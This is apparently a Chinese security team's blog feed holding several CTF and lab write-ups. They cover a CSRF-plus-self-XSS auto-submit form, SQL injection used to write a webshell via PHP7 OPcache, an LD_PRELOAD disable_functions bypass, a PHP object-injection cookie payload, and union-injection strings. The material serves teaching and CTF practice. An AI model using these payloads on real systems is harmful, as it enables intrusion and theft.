<h3 id="0x04-self-xss"><a href="#0x04-self-xss" class="headerlink" title="0x04 self-xss"></a>0x04 self-xss</h3><p>self-xss可以说是最最鸡肋的xss了，攻击者只能在自己这里弹窗，一般厂商都会选择忽略self-xss。但self-xss如果和csrf结合起来，会有意想不到的效果。</p>
<blockquote>
<p>攻击场景: 某个站点个人简介处存在self-xss，并且保存后并不触发，再次编辑会触发。添加个人简介和编辑处存在csrf</p>
</blockquote>
<p>在这种场景下，有一个思路就是：利用csrf添加xss代码，并且让攻击者点击或者跳转触发。需要给被攻击者第一个链接用于csrf插入xss代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"csrf"</span> <span class="attribute">name</span>=<span class="value">"csrf"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">action</span>=<span class="value">"http://target.com/info/add"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"name"</span> <span class="attribute">value</span>=<span class="value">"csrf_test#&lt;script&gt;alert(document.domain)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"csrf"</span>).submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再诱导被攻击者点击漏洞触发的链接：<code>http://target.com/info/edit</code>，亦或发送下面的跳转链接：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://target.com/info/edit"</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>self-xss，结合csrf便可将鸡肋变成可攻击的漏洞。</p>
<p>参考文献：</p>
<p><a href="http://drops.wooyun.org/tips/188" target="_blank" rel="external">详解XMLHttpRequest的跨域资源共享</a></p>
<p><a href="http://zone.wooyun.org/content/11969" target="_blank" rel="external">header头referer字段反射xss利用</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
      <category term="xss" scheme="http://das.scusec.org/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>alictf web writeup</title>
    <link href="http://das.scusec.org/2016/06/15/alictf-web-writeup/"/>
    <id>http://das.scusec.org/2016/06/15/alictf-web-writeup/</id>
    <published>2016-06-15T03:20:07.000Z</published>
    <updated>2016-08-23T02:30:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>web 400 homework<br>网站是一个提交作业的网站，登录验证码是输入字符的md5前四位一致则能通过验证，数字跑一下可以得到正确验证码。<a id="more"></a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import md5&#10;pre = &#34;5bc0&#34;&#10;for x in xrange(1, 1000000):&#10;    a = md5.md5(str(x))&#10;    m = a.hexdigest()&#10;    if m[:4] == pre:&#10;        print x&#10;        break</span><br></pre></td></tr></table></figure>
<p>进入后有一个作业提交点，可以上传任意文件，但是php文件内容会被改为badmen，在查看自己历史提交处存在SQL注入，看了一下数据库中没有敏感数据，支持union可以读写文件。</p>
<p><img src="/images/alictf_1.png" alt=""><br>首先根目录有三个提示文件：phpinfo.php;info.php和readme.html，其中phpinfo可以看到网站使用PHP7使用了OPcache。<br><img src="/images/alictf_2.png" alt=""></p>
<p>php7下的OPcache，可以通过在OPcache的缓存目录下写入x.php.bin文件，请求网站目录下的x.php文件时会加载缓存文件并解析，如果bin文件中写入webshell，则php文件将加载这段webshell代码。<br>上传时文件加时间戳重命名，目录无法绕过。OPcache的目录权限非常低，因此可以用sqli写入。目录格式为<br>/OPcache path/system ID/web path/<br>使用python程序计算出的机器码后，获得当前站的文件缓存目录为<br>/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/<br>上传2016223565-xxx.php文件，本地生成webshell bin文件，使用into dumpfile在目录写入2016223565-xxx.php.bin getshell。</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>获取到shell以后在phpinfo中查看到网站disable founction中禁用了php几乎所有文件的操作函数，在phpinfo中看到启用了sendmail函数库，因此可以用LD_PRELOAD绕过php disable function。<br>编译动态库上传到服务器，php调用执行动态库中的system命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php&#10;putenv(&#34;LD_PRELOAD=/path/xxx.so&#34;);&#10;mail(&#34;a@localhost&#34;,&#34;&#34;,&#34;&#34;,&#34;&#34;,&#34;&#34;);&#10;?&#62;</span><br></pre></td></tr></table></figure></p>
<p>使用echo /* &gt; /tmp/file命令获取根文件目录，找到flag文件<br><img src="/images/alictf_3.png" alt=""></p>
<p>但是系统读文件命令都被清空了，使用c的文件读写，读到flag值。</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>web 100 foundpasswd<br>系统存在很多处sql注入，甚至开始时还存在一个重复注册漏洞，因此直接可以注册HHHH，登录管理后台，然后在后台用户管理处可以联合查询。<br>loadfile下载到登录口的源代码。<br>找到用户表名和字段名。<br>在查询处获取到HHHH密码则为flag。<br>后来重复注册被修复了，xss盲打管理员cookie找到后台的联合查询注入点后select管理员密码。  </p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h3&gt;&lt;p&gt;web 400 homework&lt;br&gt;网站是一个提交作业的网站，登录验证码是输入字符的md5前四位一致则能通过验证，数字跑一下可以得到正确验证码。
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="das" scheme="http://das.scusec.org/tags/das/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
      <category term="lab" scheme="http://das.scusec.org/tags/lab/"/>
    
  </entry>
  
  <entry>
    <title>小记一次PHP对象注入</title>
    <link href="http://das.scusec.org/2016/05/19/php-obj-injection/"/>
    <id>http://das.scusec.org/2016/05/19/php-obj-injection/</id>
    <published>2016-05-19T01:45:20.000Z</published>
    <updated>2016-07-28T07:12:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-写在前面"><a href="#1-写在前面" class="headerlink" title="1. 写在前面"></a>1. 写在前面</h3><p>最近经常会遇到一些比较有意思的漏洞，比如<strong>PHP反序列化漏洞</strong>,<strong>PHP对象注入</strong>。这些漏洞可能在平时很难遇到，但是在CTF以及一些CMS倒是经常看到他们的背影。今天刚刚好手上看到了某CTF的代码，但是并没有获取所有源码，因此修改了部分代码进行分析。<a id="more"></a> </p>
<h3 id="2-自动加载"><a href="#2-自动加载" class="headerlink" title="2. 自动加载"></a>2. 自动加载</h3><h4 id="2-0-为什么要自动加载？"><a href="#2-0-为什么要自动加载？" class="headerlink" title="2.0 为什么要自动加载？"></a>2.0 为什么要自动加载？</h4><p>在面向对象编程中，程序员经常会编写好类然后在一个入口文件中将它们包含进来。如果一个项目非常大，可能存在成百上千个类文件，如果一一包含进去，那么入口文件就会显得特别大并且不利于维护。因此，PHP5提供了一种自动加载机制。</p>
<h4 id="2-1-autoload"><a href="#2-1-autoload" class="headerlink" title="2.1 __autoload"></a>2.1 __autoload</h4><blockquote>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">(<span class="variable">$classname</span>)</span></span>&#123;</span><br><span class="line">	<span class="variable">$class_file</span> = strtolower(<span class="variable">$classname</span>).<span class="string">".php"</span>;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(<span class="variable">$class_file</span>))&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(<span class="string">"$class_file"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$class_file does not exist!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> File();</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>访问index.php,程序会实例化File类。PHP的解析器会自动调用__autoload()函数。假设当前目录下没有file.php,那么就会输出 “file.php does not exist!” 并且抛出错误。</p>
<blockquote>
<p>file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"File class is instantiated"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>此时访问index.php,就会得到 “File class is instantiated” 的结果。这样一来，自动加载机制就非常好理解了。</p>
<p>不过,__autoload()最大的问题就是只有一个autoload。举个例子，如果我的项目里面里面引入了其它的文件，而在其它文件里面也定义了autoload，这样就会导致冲突。这样的情况下，spl系列函数就出现了。</p>
<h4 id="2-2-手动调用-spl-autoload"><a href="#2-2-手动调用-spl-autoload" class="headerlink" title="2.2 手动调用 spl_autoload"></a>2.2 手动调用 spl_autoload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void spl_autoload ( string <span class="variable">$class_name</span> [, string <span class="variable">$file_extensions</span> ] )</span><br></pre></td></tr></table></figure>
<ul>
<li>它可以接收两个参数，第一个参数是$class_name，表示类名。第二个参数$file_extensions是可选的，表示类文件的扩展名;如果不指定的话，<strong>它将使用默认的扩展名.inc或.php</strong>。</li>
<li>spl_autoload首先将$class_name变为小写，然后在所有的include path中搜索$class_name.inc或$class_name.php文件(如果不指定$file_extensions参数的话)，如果找到，就加载该类文件。</li>
<li>同样，你可以手动使用spl_autoload(“Person”, “.class.php”)来加载Person类。<strong>实际上，它跟require/include差不多</strong></li>
</ul>
<blockquote>
<p>举个例子</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload(<span class="string">"upload"</span>);</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> Upload();</span><br></pre></td></tr></table></figure>
<p>这里没有指定扩展名，那么就会在当前目录下寻找upload.inc或者upload.php并自动加载。其实，到这里而言，和require、include相比并没有简单。相反，它们的功能基本是一模一样的。</p>
<h4 id="2-3-自动调用-spl-autoload"><a href="#2-3-自动调用-spl-autoload" class="headerlink" title="2.3 自动调用 spl_autoload"></a>2.3 自动调用 spl_autoload</h4><p>上面所说的使用手动的方式调用spl_autoload,工作量其实和require/include基本上差不多。调用spl_autoload_register()的时候，如果没有指定欲注册的自动装载函数，则自动注册 autoload 的默认实现函数spl_autoload()。</p>
<blockquote>
<p>举个例子:</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line"><span class="variable">$F</span> = <span class="keyword">new</span> Upload();</span><br></pre></td></tr></table></figure>
<p>此时，程序会在当前路径下自动加载upload.inc或upload.php。</p>
<h3 id="3-对象反序列化"><a href="#3-对象反序列化" class="headerlink" title="3. 对象反序列化"></a>3. 对象反序列化</h3><ul>
<li><p>字符串序列化成类之前，类必须提前声明，否则无法反序列化。</p>
</li>
<li><p>字符串在反序列化的时候，会自动调用__wakeup()魔术方法</p>
</li>
<li><p>Object序列化格式-&gt; O:strlen(对象名):对象名:对象大小:{s:strlen(属性名):属性名:属性值;(重复剩下的元素)}</p>
</li>
</ul>
<h3 id="4-漏洞剖析"><a href="#4-漏洞剖析" class="headerlink" title="4. 漏洞剖析"></a>4. 漏洞剖析</h3><blockquote>
<p>index.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">"act"</span>]) &amp;&amp; preg_match(<span class="string">'/^[a-z0-9_]+$/is'</span>, <span class="variable">$req</span>[<span class="string">"act"</span>])) &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/"</span> . <span class="variable">$req</span>[<span class="string">"act"</span>] . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>common.inc.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="variable">$req</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([<span class="variable">$_GET</span>, <span class="variable">$_POST</span>] <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$userinfo</span> = <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">"userinfo"</span>]) ? unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"userinfo"</span>]) : [];</span><br></pre></td></tr></table></figure>
<blockquote>
<p>upload.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"error"</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'size'</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'size'</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeAccepted</span> = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php3"</span>, <span class="string">"html"</span>, <span class="string">"swf"</span>, <span class="string">"htm"</span>];</span><br><span class="line">        <span class="variable">$filearr</span> = pathinfo(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"name"</span>]);	</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">'type'</span>], <span class="variable">$typeAccepted</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"type error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filearr</span>[<span class="string">"extension"</span>], <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"extension error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"name"</span>];</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$filename</span>)) &#123;    </span><br><span class="line">            array_push(<span class="variable">$userinfo</span>, <span class="variable">$filename</span>);</span><br><span class="line">            setcookie(<span class="string">"userinfo"</span>, serialize(<span class="variable">$userinfo</span>), time() + <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span>);</span><br><span class="line">            <span class="keyword">echo</span> htmlspecialchars(<span class="string">"upload success, new filename is &#123;$filename&#125; ."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"upload error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"no upload file"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在common.inc.php中执行了spl_autoload_register()函数，并没有使用参数。</p>
</li>
<li><p>后缀没有禁止.inc的类型</p>
</li>
<li><p>在common.inc.php会反序列化COOKIE中的数据</p>
</li>
<li><p>上传目录在当前目录下</p>
</li>
</ul>
<p>因此我们需要如下构造:</p>
<ul>
<li><p>上传一个名为info.inc的文件，抓包修改MIME类型</p>
</li>
<li><p>info.inc的内容如下所示:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		phpinfo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改cookie的uesrinfo字段为:O:4:”info”:0:{}</p>
</li>
<li><p>访问index.php即可触发phpinfo()函数。</p>
</li>
</ul>
<h3 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5. 参考资料"></a>5. 参考资料</h3><ul>
<li><a href="http://blog.itpub.net/14883374/viewspace-526720" target="_blank" rel="external">PHP autoload机制详解</a></li>
<li><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">理解php对象注入</a></li>
<li><a href="http://drops.wooyun.org/tips/3909" target="_blank" rel="external">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li>
<li><a href="http://ecma.io/?p=291" target="_blank" rel="external">小记一次PHP对象注入</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-写在前面&quot;&gt;&lt;a href=&quot;#1-写在前面&quot; class=&quot;headerlink&quot; title=&quot;1. 写在前面&quot;&gt;&lt;/a&gt;1. 写在前面&lt;/h3&gt;&lt;p&gt;最近经常会遇到一些比较有意思的漏洞，比如&lt;strong&gt;PHP反序列化漏洞&lt;/strong&gt;,&lt;strong&gt;PHP对象注入&lt;/strong&gt;。这些漏洞可能在平时很难遇到，但是在CTF以及一些CMS倒是经常看到他们的背影。今天刚刚好手上看到了某CTF的代码，但是并没有获取所有源码，因此修改了部分代码进行分析。
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://das.scusec.org/tags/PHP/"/>
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="对象注入" scheme="http://das.scusec.org/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    
      <category term="该隐" scheme="http://das.scusec.org/tags/%E8%AF%A5%E9%9A%90/"/>
    
  </entry>
  
  <entry>
    <title>whctf-writeup-all</title>
    <link href="http://das.scusec.org/2016/05/16/whctf-writeup-all/"/>
    <id>http://das.scusec.org/2016/05/16/whctf-writeup-all/</id>
    <published>2016-05-16T07:52:42.000Z</published>
    <updated>2016-07-28T07:12:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://time.xctf.org.cn/ctfs/event/19/tasks" target="_blank" rel="external">地址&gt;&gt;请猛戳&lt;&lt;</a></p>
<h3 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题</h3><p>0x01. 信息</p>
<p>打开是一个代码下载链接，下载下来是wireshark抓的cap包，打开包分析发现两个http的包，get请求下载了zip的压缩包，利用wireshark导出zip包-File-Export Objects-HTTP。发现需要密码打开，官方提示华科官网，解压密码<code>www.hust.edu.cn</code>，flag在flag3.docx中 <a id="more"></a> </p>
<p>0x02. 窃取</p>
<p>测试地址存在union注入，利用sqlmap在<strong>wh_ct4_hgduyingjkhjhjg</strong>库中发现flag的提示<code>flag is nothere,but I can tell you the flag is xor user&#39;s password.</code>，那么到<strong>web_sqli</strong>库中，将user1和user2的password异或后解密，得到flag:hust</p>
<p>0x03. 忘了账户和密码</p>
<p>username: <code>&#39; union select 1,2,3-- -</code> , 三列</p>
<p>password: 任意</p>
<p>0x04. find</p>
<p>右键源代码，发现<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css/[adwxhyz]&#123;2&#125;ctf[0-9]&#123;7&#125;.css"</span><br></pre></td></tr></table></figure></p>
<p>前两位字符，后7位数字的正则，大胆猜测前两位是wh，后7位直到官方给了提示（），一个qq号，搜索qq的资料，发现其为1999年5月12的生日，尝试css/whctf1999512.css成功，flag就在里面<code>whctf{Wh3tF_H@rd}</code></p>
<p>0x05. beat it</p>
<p>打开又是一个pcap的包下载，三个ipv4的协议包，尝试重组将中间的丢弃，把data组合hex两次转字符串，得到flag<code>whctf{000 here it is the flag 000}</code></p>
<p>0x06. 密码忘了怎么办？</p>
<p>登录口sql注入，还是union的，注入发现user表有flag字段，将12,13,14,15行的flag字段组合<br><code>whctf{hello$$##itisme&amp;---&amp;&amp;&amp;}</code></p>
<p>0x07. 看图说话</p>
<p>给的提示里ctf页面脚本,猜测存在ctf.php，打开是302跳转，返回包里有张图片链接<br><code>templates/images/xxx/ctf.jpg</code><br>，将图片下载下载利用notepad++打开，flag在最后<code>whctf{today@@isnot09#$tomorrow}</code></p>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><p>0x01 我叫李二狗（一）<br>直接base64解密，然后李二狗是近视，将l换成1，x换成1，md5解密</p>
<p>0x02 李二狗的梦中情人<br>将隐藏在图片末尾的链接中的图片提取出来，然后convert转换成png格式，diff下得到一个二维码，二维码黑白反转下，得到正确的二维码，扫一下，bingo</p>
<p>0x03 我叫李二狗（二）<br>给了两个RSA加密，由于其弱密钥，N太小，直接分解大数，破解</p>
<p>0x04 李二狗的LOL战歌<br>听音乐，感觉音频右声道像电报，然后翻译成摩斯编码，直接得到13位字符，然后用ROT13编码转换下，得到flag</p>
<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>0x01 直接爆破</p>
<p>相关代码<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#34;stdafx.h&#34;&#10;#include &#34;stdio.h&#34;&#10;#include &#60;string.h&#62;&#10;&#10;int main(int argc, char* argv[])&#10;&#123;&#10;  __int64 seeda=1;&#10;  __int64 lenKey=38;&#10;  __int64 count;&#10;  __int64 k;&#10;  __int64 j;&#10;&#10;&#10;  char key[]=&#34;Just try your best and enjoy yourself!&#34;;&#10;&#10;  __int64 result[]=&#123;157,2400,2215,1971,1732,1527,2053,1878,1988,787,1584,1856,1717,2187,1971,34,1732,1259,1669,1726,1946,1967,1369&#125;;&#10;  for ( count = 0; count &#60; 23; ++count )&#10;  &#123;&#10;    k = key[seeda];&#10;&#9;for ( j = 0; j &#60; 512; ++j )&#10;&#9;&#123;&#10;&#9;&#9;//char s[1];&#10;&#9;//&#9;sprintf(s, &#34;%x&#34;, j);&#10;&#9;&#9;if(strchr(key,j)!=0)&#10;&#9;&#9;&#123;&#10;&#9;&#9;&#9;if(result[count] == (0x10 * j + k) % 0x9C4)&#10;&#9;&#9;&#9;&#123;&#10;&#9;&#9;&#9;&#9;printf(&#34;flag %I64d count-InStr %c\n&#34;,count,j);&#10;&#9;&#9;&#9;&#9;//printf(&#34;%c&#34;,j);&#10;&#9;&#9;&#9;&#9;break;&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#9;&#9;else&#10;&#9;&#9;&#123;&#10;&#9;&#9;&#9;if(result[count] == (j ^ (k &#60;&#60; seeda)) % 0x9C4)&#10;&#9;&#9;&#9;&#123;&#10;&#9;&#9;&#9;&#9;printf(&#34;flag %I64d count-OutStr %c\n&#34;,count,j);&#10;&#9;&#9;&#9;&#9;break;&#10;&#9;&#9;&#9;&#9;//printf(&#34;%c&#34;,j);&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#10;&#9;&#125;&#10;&#9;seeda = (seeda + 5) % lenKey;&#10;  &#125;&#10; return 0;&#10;&#125;</span><br></pre></td></tr></table></figure></p>
<p>flag <code>whctf{you_are_the_best}</code></p>
<h3 id="revserse"><a href="#revserse" class="headerlink" title="revserse"></a>revserse</h3><p>0x03. 定位坐标</p>
<p>安装Crackme_3.apk运行，发现与之前阿里的比赛题很像，任意输入后查看Log日志，打印出了table信息和pw:亡丸凡亡丸凡义义凡么么门凡广义凡之，利用这两个信息，调用apk中的解密函数aliCodeToBytes(String paramString1, String paramString2)，即可直接打印出结果：30-30-55-114-25-6，加上whctf{}就是flag了。</p>
